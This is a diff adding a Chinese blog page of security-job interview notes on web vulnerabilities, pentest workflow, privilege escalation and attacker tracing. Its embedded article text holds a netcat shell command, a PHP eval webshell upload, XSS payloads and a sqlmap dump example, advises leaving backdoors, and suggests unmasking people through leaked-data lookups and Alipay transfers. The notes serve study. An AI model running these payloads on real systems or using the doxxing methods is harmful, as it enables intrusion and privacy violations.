@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>安服面试可能问题整理 | x1a0&#39;s Blog</title>
+<meta name="keywords" content="标签1, 标签2">
+<meta name="description" content="大部分为OWASP top 10的相关情况 反弹shell nc -lvvp 7777 -e /bin/bash 一、sql注入 原理 当web应用向后台数据库传递SQL语句进行数据库操作时如果对用户">
+<meta name="author" content="x1a0">
+<link rel="canonical" href="https://x1a05hen.github.io/posts/learn/offer/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fb5f926f9bd100bd15539bcec104f406ce779900a6a5a7ee19381d2f2b75ec9f.css" integrity="sha256-&#43;1&#43;Sb5vRAL0VU5vOwQT0Bs53mQCmpafuGTgdLyt17J8=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js" integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://x1a05hen.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://x1a05hen.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://x1a05hen.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://x1a05hen.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://x1a05hen.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="安服面试可能问题整理" />
+<meta property="og:description" content="大部分为OWASP top 10的相关情况 反弹shell nc -lvvp 7777 -e /bin/bash 一、sql注入 原理 当web应用向后台数据库传递SQL语句进行数据库操作时如果对用户" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://x1a05hen.github.io/posts/learn/offer/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-31T19:27:10+08:00" />
+<meta property="article:modified_time" content="2023-03-31T19:27:10+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="安服面试可能问题整理"/>
+<meta name="twitter:description" content="大部分为OWASP top 10的相关情况 反弹shell nc -lvvp 7777 -e /bin/bash 一、sql注入 原理 当web应用向后台数据库传递SQL语句进行数据库操作时如果对用户"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "📚文章列表",
+      "item": "https://x1a05hen.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "📕各类学习",
+      "item": "https://x1a05hen.github.io/posts/learn/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "安服面试可能问题整理",
+      "item": "https://x1a05hen.github.io/posts/learn/offer/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "安服面试可能问题整理",
+  "name": "安服面试可能问题整理",
+  "description": "大部分为OWASP top 10的相关情况 反弹shell nc -lvvp 7777 -e /bin/bash 一、sql注入 原理 当web应用向后台数据库传递SQL语句进行数据库操作时如果对用户",
+  "keywords": [
+    "标签1", "标签2"
+  ],
+  "articleBody": "大部分为OWASP top 10的相关情况\n反弹shell\nnc -lvvp 7777 -e /bin/bash 一、sql注入 原理 当web应用向后台数据库传递SQL语句进行数据库操作时如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。\n本质：把用户输入的数据当作代码来执行\n分类 1.按输入类型 数值型注入\n字符型注入\n单引号、双引号、带括号\n2.按请求方式 GET POST Cookie HTTP Header user-agent:判定用户使用的操作系统，以及使用的浏览器的版本 cookie:判定用户的身份，进行session跟踪可以存储在用户本地终端上的数据，简单理解为用户的一张身份辨别卡 x-forwarded-for:是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段 client-ip: 数据库保存客户端IP的参数 rerferer:浏览器向web端表明自己从哪个连接而来 host:客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号\n3.按是否回显 显注 报错注入、联合查询、堆叠、宽字节\n盲注 布尔盲注、时间盲注、dnslog盲注\nsqlmap 一些参数\n-D,-T,-C,-currentuser，-current-db，--dump -cookie，-referer，-user-agent 例子\npython3 sqlmap.py -r post.txt -D pikachu -T member -C username,email --dump 绕过方式 大小写\n双写\n编码\n空格\n等价函数\n方式（详细） 例子\n简单联合查询union注入\n布尔注入\n堆叠注入\n时间盲注\n报错注入\nupdatexml()，extractvalue()，floor() ,exp() 宽字节\n二次编码\ndnslog\n预防措施 不信任用户的任何输入，一定一定要对可能引起注入的字符做转义和过滤 白名单方式 限制查询长度和类型 数据库用户的权限配置 限制目录权限 Mysql注入特征 3306，默认不区分大小写，information_schema信息数据库\n二、登录框测试 1、登录成功后生成的Cookie，是否是httponly (否则容易被脚本盗取)\n2、用户名和密码是否通过加密的方式发送给web服务器\n3、用户名和密码的验证，应该是用服务器验证，而不单单是在客户端用javascript验证\n4、用户名和密码的输入框，是否屏蔽SQL注入攻击\n5、用户名和密码的输入框，应该禁止输入脚本（防止XSS攻击）\n6、是否有错误登录的次数限制（防止暴力破解）\n三、文件上传 黑名单绕过 大小写，重写，特殊解析（php3,5,7），加空格，加点绕过，.htaccess\n白名单 %00截断，修改MIME文件类型\n修复 白名单的方式判断文件后缀是否合法。\n重写文件名\n设置不可执行\n四、文件包含 include，require 文件包含 http://192.168.65.135:3366/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2022/05/21/9097236288ae320dc16631692493.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2\n待补档，没有太深入学\n五、XSS 原理 XSS的原理是WEB应用程序混淆了用户提交的数据和JS脚本的代码边界，导致浏览器把用户的输入当成了JS代码来执行。\n\u003cscript\u003ealert(\"xss\")\u003c/script\u003e #' onclick=\"alert('xss')\"\u003e 反射型：用户点击\n存储型：存在服务器，访问即中招\nDOM型：只是前段，特殊反射\n防御 验证，编码，检测和过滤\n对输入(和URL参数)进行过滤，对输出进行转义。\n六、CSRF 原理 攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。常用于盗取账号、转账、发送虚假消息等。攻击者利用网站对请求的验证漏洞而实现这样的攻击行为，网站能够确认请求来源于用户的浏览器，却不能验证请求是否源于用户的真实意愿下的操作行为。\n以下为pikachu靶场的测试用例\n姓名:allen\n性别:boy\n手机:13676767767\n住址:nba 76\n邮箱:allen@pikachu.com\n/vul/csrf/csrfget/csrf_get_edit.php?sex=1\u0026phonenum=1\u0026add=1\u0026email=1\u0026submit=submit 修复 token\n验证Referer\n七、ssrf 原理 SSRF 漏洞的产生，主要是因为在服务端的 Web 应用，需要从其他服务器拉取数据资源，比如图片、视频、文件的上传/下载、业务数据处理结果，但其请求地址可被外部用户控制。\nhttp://192.168.65.135:3366/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/vul/ssrf/1.txt\n修复 禁止302跳转，或者每跳转一次都进行校验目的地址是否为内网地址或合法地址。 过滤返回信息，验证远程服务器对请求的返回结果，是否合法。 禁用高危协议，例如：gopher、dict、ftp、file等，只允许http/https。 设置URL白名单或者限制内网IP。 限制请求的端口为http的常用端口，或者根据业务需要开放远程调用服务的端口。 catch错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务。 八、文件上传 —————————–198337553110896437781972103010 Content-Disposition: form-data; name=“uploadfile”; filename=“shell.php%00.jpg” Content-Type: image/jpg\nGIF89a?\n\u003c?php @eval($_POST['cmd']); ?\u003e 九、渗透测试基本流程和工具 流程 1.明确目标 2.分析风险，获得授权 3.信息收集\nIP、端口识别框架、服务器类型、数据库类型等等\n4.漏洞探测（手动\u0026自动）\nAWVS,Appscan\n5.漏洞验证\n6.信息分析 7.利用漏洞，获取数据\n留后门，擦脚印\n8.信息整理 9.形成报告\n工具 Burp Suite\nNmap\nsqlmap\nAppScan\n御剑\nshell管理工具，蚁剑冰蝎哥斯拉\n在线的whois\n各种搜索引擎\n社工库\n漏扫工具 AWVS、Goby、Appscan\n十、其他的一些杂项 蚁剑冰蝎哥斯拉区别 1. 蚁剑 两次http请求\n第一次 url编码@ini_set(“display_errors”, “0”);@set_time_limit(0);\n第二次 列出目录\n0\n2. 冰蝎 两次\n第一次 请求\n第二次 phpinfo\nAES 密码是md5散列值的前16位，MD5 值前 16 位已经在服务端写死了并加入 session\n3. 哥斯拉 三次\n第一次 请求数据建立session\n第二次响应设置session\n第三次 第二次响应一致\n内网渗透工具 cobalt strike\nmsf\nmimikatz\new Earthworm\nfrp\n域渗透 知乎\n将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库\n通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。\n提权、权限维持 脏牛提权 Linux Kernel\u003e=2.6.22的所有linux主机（没打过补丁的）\nsudo提权，glibc提取、suid提权\nms14-058 admin -\u003e system\nms14-068 域电脑 -\u003e 域控主机\n漏洞产生原理：用户在向 Kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么，返给用户的TGT就使普通域用户拥有了域管理员权限。该用户可以将TGT发送到KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。\n查看是否打补丁(KB3011780) systeminfo wmic qfe get hotfixid 攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码/hash值，以及用户的suid 应急响应工具 思路\nhttps://blog.csdn.net/qq_53577336/article/details/120676981\n火麒麟：看进程，成员\n360星图，看日志文件\n微步情报分析\n在线沙箱\n病毒查杀\n大全\n漏洞复现 iis，nginx解析漏洞，永恒之蓝\nweblogic，shiro，fastjson，stust2，log4j，jboss\nIIS IIS 6.0—— /xx.asp/xx.jpg\nIIS 7.0—— 默认Fast-cgi开启，直接在图片地址后面输入/.php就会将图片当做php解析\nApache Apache—— 上传文件名为test.php.x1.x2.x3, Apache是从右往左判断\nNginx Nginx——版本小于0.8.37 利用方法和IIS7.0一样\nJBoss WebLogic Shiro反序列化漏洞 shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：\n得到rememberMe的cookie值 –\u003e Base64解码 –\u003e AES解密 –\u003e 反序列化\n然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。\npayload 构造的顺序则就是相对的反着来：\n恶意命令–\u003e序列化–\u003eAES加密–\u003ebase64编码–\u003e发送cookie\n在整个漏洞利用过程中，比较重要的是AES加密的密钥，该秘钥默认是默认硬编码的，所以如果没有修改默认的密钥，就自己可以生成恶意构造的cookie了。\n横向渗透 SMB横向-psexec\u0026smbexec\n流量转发工具 ew Earthworm\nfrp\ncs\n流量分析 wireshark\n科来\nhttp matches “(.*?)eval”\nip.addr ==101.36.79.67 \u0026\u0026 http matches “(.*?)acunetix”\n溯源 获取IP，上线威胁情报社区分析，ping得到ip，反查域名查whois信息\n历史注册域名\n手机号就丢进社工库\n支付宝转账得姓名\nQQ得到更多信息\nwaf绕过 大小写、特殊字符替换空格和字符、编码绕过\n",
+  "wordCount" : "3452",
+  "inLanguage": "en",
+  "datePublished": "2023-03-31T19:27:10+08:00",
+  "dateModified": "2023-03-31T19:27:10+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "x1a0"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://x1a05hen.github.io/posts/learn/offer/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "x1a0's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://x1a05hen.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://x1a05hen.github.io" accesskey="h" title="x1a0&#39;s Blog (Alt + H)">x1a0&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://x1a05hen.github.io/search" title="🔍搜索">
+                    <span>🔍搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://x1a05hen.github.io/" title="🏠主页">
+                    <span>🏠主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://x1a05hen.github.io/posts" title="📚文章">
+                    <span>📚文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://x1a05hen.github.io/archives/" title="⏱时间轴">
+                    <span>⏱时间轴</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://x1a05hen.github.io">Home</a>&nbsp;»&nbsp;<a href="https://x1a05hen.github.io/posts/">📚文章列表</a>&nbsp;»&nbsp;<a href="https://x1a05hen.github.io/posts/learn/">📕各类学习</a></div>
+    <h1 class="post-title">
+      安服面试可能问题整理
+    </h1>
+    <div class="post-meta">
+
+
+
+
+
+
+
+
+
+
+创建:&nbsp;<span title='2023-03-31 19:27:10 +0800 CST'>2023-03-31</span>&nbsp;|&nbsp;更新:&nbsp;2023-03-31&nbsp;|&nbsp;字数:&nbsp;3452字&nbsp;|&nbsp;时长: 7分钟&nbsp;|&nbsp;x1a0
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">Table of Contents</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e4%b8%80sql%e6%b3%a8%e5%85%a5" aria-label="一、sql注入">一、sql注入</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%8e%9f%e7%90%86" aria-label="原理">原理</a></li>
+                    <li>
+                        <a href="#%e5%88%86%e7%b1%bb" aria-label="分类">分类</a><ul>
+                            
+                    <li>
+                        <a href="#1%e6%8c%89%e8%be%93%e5%85%a5%e7%b1%bb%e5%9e%8b" aria-label="1.按输入类型">1.按输入类型</a></li>
+                    <li>
+                        <a href="#2%e6%8c%89%e8%af%b7%e6%b1%82%e6%96%b9%e5%bc%8f" aria-label="2.按请求方式">2.按请求方式</a></li>
+                    <li>
+                        <a href="#3%e6%8c%89%e6%98%af%e5%90%a6%e5%9b%9e%e6%98%be" aria-label="3.按是否回显">3.按是否回显</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#sqlmap" aria-label="sqlmap">sqlmap</a></li>
+                    <li>
+                        <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e5%bc%8f" aria-label="绕过方式">绕过方式</a></li>
+                    <li>
+                        <a href="#%e6%96%b9%e5%bc%8f%e8%af%a6%e7%bb%86" aria-label="方式（详细）">方式（详细）</a></li>
+                    <li>
+                        <a href="#%e9%a2%84%e9%98%b2%e6%8e%aa%e6%96%bd" aria-label="预防措施">预防措施</a></li>
+                    <li>
+                        <a href="#mysql%e6%b3%a8%e5%85%a5%e7%89%b9%e5%be%81" aria-label="Mysql注入特征">Mysql注入特征</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e4%ba%8c%e7%99%bb%e5%bd%95%e6%a1%86%e6%b5%8b%e8%af%95" aria-label="二、登录框测试">二、登录框测试</a></li>
+                    <li>
+                        <a href="#%e4%b8%89%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" aria-label="三、文件上传">三、文件上传</a><ul>
+                            
+                    <li>
+                        <a href="#%e9%bb%91%e5%90%8d%e5%8d%95%e7%bb%95%e8%bf%87" aria-label="黑名单绕过">黑名单绕过</a></li>
+                    <li>
+                        <a href="#%e7%99%bd%e5%90%8d%e5%8d%95" aria-label="白名单">白名单</a></li>
+                    <li>
+                        <a href="#%e4%bf%ae%e5%a4%8d" aria-label="修复">修复</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%9b%9b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" aria-label="四、文件包含">四、文件包含</a><ul>
+                            <ul>
+                            
+                    <li>
+                        <a href="#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" aria-label="文件包含">文件包含</a></li></ul>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#%e4%ba%94xss" aria-label="五、XSS">五、XSS</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%8e%9f%e7%90%86-1" aria-label="原理">原理</a></li>
+                    <li>
+                        <a href="#%e9%98%b2%e5%be%a1" aria-label="防御">防御</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%85%adcsrf" aria-label="六、CSRF">六、CSRF</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%8e%9f%e7%90%86-2" aria-label="原理">原理</a></li>
+                    <li>
+                        <a href="#%e4%bf%ae%e5%a4%8d-1" aria-label="修复">修复</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e4%b8%83ssrf" aria-label="七、ssrf">七、ssrf</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%8e%9f%e7%90%86-3" aria-label="原理">原理</a></li>
+                    <li>
+                        <a href="#%e4%bf%ae%e5%a4%8d-2" aria-label="修复">修复</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%85%ab%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" aria-label="八、文件上传">八、文件上传</a></li>
+                    <li>
+                        <a href="#%e4%b9%9d%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e5%9f%ba%e6%9c%ac%e6%b5%81%e7%a8%8b%e5%92%8c%e5%b7%a5%e5%85%b7" aria-label="九、渗透测试基本流程和工具">九、渗透测试基本流程和工具</a><ul>
+                            
+                    <li>
+                        <a href="#%e6%b5%81%e7%a8%8b" aria-label="流程">流程</a></li>
+                    <li>
+                        <a href="#%e5%b7%a5%e5%85%b7" aria-label="工具">工具</a></li>
+                    <li>
+                        <a href="#%e6%bc%8f%e6%89%ab%e5%b7%a5%e5%85%b7" aria-label="漏扫工具">漏扫工具</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%8d%81%e5%85%b6%e4%bb%96%e7%9a%84%e4%b8%80%e4%ba%9b%e6%9d%82%e9%a1%b9" aria-label="十、其他的一些杂项">十、其他的一些杂项</a><ul>
+                            
+                    <li>
+                        <a href="#%e8%9a%81%e5%89%91%e5%86%b0%e8%9d%8e%e5%93%a5%e6%96%af%e6%8b%89%e5%8c%ba%e5%88%ab" aria-label="蚁剑冰蝎哥斯拉区别">蚁剑冰蝎哥斯拉区别</a><ul>
+                            
+                    <li>
+                        <a href="#1-%e8%9a%81%e5%89%91" aria-label="1. 蚁剑">1. 蚁剑</a></li>
+                    <li>
+                        <a href="#2-%e5%86%b0%e8%9d%8e" aria-label="2. 冰蝎">2. 冰蝎</a></li>
+                    <li>
+                        <a href="#3-%e5%93%a5%e6%96%af%e6%8b%89" aria-label="3. 哥斯拉">3. 哥斯拉</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f%e5%b7%a5%e5%85%b7" aria-label="内网渗透工具">内网渗透工具</a></li>
+                    <li>
+                        <a href="#%e5%9f%9f%e6%b8%97%e9%80%8f" aria-label="域渗透">域渗透</a></li>
+                    <li>
+                        <a href="#%e6%8f%90%e6%9d%83%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81" aria-label="提权、权限维持">提权、权限维持</a><ul>
+                            
+                    <li>
+                        <a href="#%e8%84%8f%e7%89%9b%e6%8f%90%e6%9d%83" aria-label="脏牛提权">脏牛提权</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94%e5%b7%a5%e5%85%b7" aria-label="应急响应工具">应急响应工具</a></li>
+                    <li>
+                        <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" aria-label="漏洞复现">漏洞复现</a></li>
+                    <li>
+                        <a href="#%e6%a8%aa%e5%90%91%e6%b8%97%e9%80%8f" aria-label="横向渗透">横向渗透</a></li>
+                    <li>
+                        <a href="#%e6%b5%81%e9%87%8f%e8%bd%ac%e5%8f%91%e5%b7%a5%e5%85%b7" aria-label="流量转发工具">流量转发工具</a></li>
+                    <li>
+                        <a href="#%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90" aria-label="流量分析">流量分析</a></li>
+                    <li>
+                        <a href="#%e6%ba%af%e6%ba%90" aria-label="溯源">溯源</a></li>
+                    <li>
+                        <a href="#waf%e7%bb%95%e8%bf%87" aria-label="waf绕过">waf绕过</a>
+                    </li>
+                </ul>
+                </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    window.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+         
+         activeElement = elements[0];
+         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+     }, false);
+
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+
+    window.addEventListener('scroll', () => {
+        
+        activeElement = Array.from(elements).find((element) => {
+            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
+                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
+                return element;
+            }
+        }) || activeElement
+
+        elements.forEach(element => {
+             const id = encodeURI(element.getAttribute('id')).toLowerCase();
+             if (element === activeElement){
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+             } else {
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
+             }
+         })
+     }, false);
+
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+</script>
+
+  <div class="post-content"><p>大部分为OWASP top 10的相关情况</p>
+<p>反弹shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvvp <span style="color:#ae81ff">7777</span> -e /bin/bash
+</span></span></code></pre></div><h1 id="一sql注入">一、sql注入<a hidden class="anchor" aria-hidden="true" href="#一sql注入">#</a></h1>
+<h2 id="原理">原理<a hidden class="anchor" aria-hidden="true" href="#原理">#</a></h2>
+<p>当web应用向后台数据库传递<a href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&amp;spm=1001.2101.3001.7020">SQL语句</a>进行数据库操作时如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
+<p><code>本质</code>：把用户输入的数据当作代码来执行</p>
+<h2 id="分类">分类<a hidden class="anchor" aria-hidden="true" href="#分类">#</a></h2>
+<h3 id="1按输入类型">1.按输入类型<a hidden class="anchor" aria-hidden="true" href="#1按输入类型">#</a></h3>
+<ol>
+<li>
+<p>数值型注入</p>
+</li>
+<li>
+<p>字符型注入</p>
+<p>单引号、双引号、带括号</p>
+</li>
+</ol>
+<h3 id="2按请求方式">2.按请求方式<a hidden class="anchor" aria-hidden="true" href="#2按请求方式">#</a></h3>
+<ol>
+<li>GET</li>
+<li>POST</li>
+<li>Cookie</li>
+<li>HTTP Header</li>
+</ol>
+<p><code>user-agent</code>:判定用户使用的操作系统，以及使用的浏览器的版本
+<code>cookie</code>:判定用户的身份，进行session跟踪可以存储在用户本地终端上的数据，简单理解为用户的一张身份辨别卡
+<code>x-forwarded-for</code>:是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段
+<code>client-ip</code>: 数据库保存客户端IP的参数
+<code>rerferer</code>:浏览器向web端表明自己从哪个连接而来
+<code>host</code>:客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号</p>
+<h3 id="3按是否回显">3.按是否回显<a hidden class="anchor" aria-hidden="true" href="#3按是否回显">#</a></h3>
+<ol>
+<li>显注</li>
+</ol>
+<p>报错注入、联合查询、堆叠、宽字节</p>
+<ol>
+<li>盲注</li>
+</ol>
+<p>布尔盲注、时间盲注、dnslog盲注</p>
+<h2 id="sqlmap">sqlmap<a hidden class="anchor" aria-hidden="true" href="#sqlmap">#</a></h2>
+<p>一些参数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-D,-T,-C,-currentuser，-current-db，--dump
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-cookie，-referer，-user-agent
+</span></span></code></pre></div><p>例子</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 sqlmap.py -r post.txt -D pikachu -T member -C username,email --dump
+</span></span></code></pre></div><h2 id="绕过方式">绕过方式<a hidden class="anchor" aria-hidden="true" href="#绕过方式">#</a></h2>
+<p>大小写</p>
+<p>双写</p>
+<p>编码</p>
+<p>空格</p>
+<p>等价函数</p>
+<h2 id="方式详细">方式（详细）<a hidden class="anchor" aria-hidden="true" href="#方式详细">#</a></h2>
+<p><a href="https://blog.csdn.net/weixin_40149557/article/details/118098133">例子</a></p>
+<ol>
+<li>
+<p>简单联合查询union注入</p>
+</li>
+<li>
+<p>布尔注入</p>
+</li>
+<li>
+<p>堆叠注入</p>
+</li>
+<li>
+<p>时间盲注</p>
+</li>
+<li>
+<p>报错注入</p>
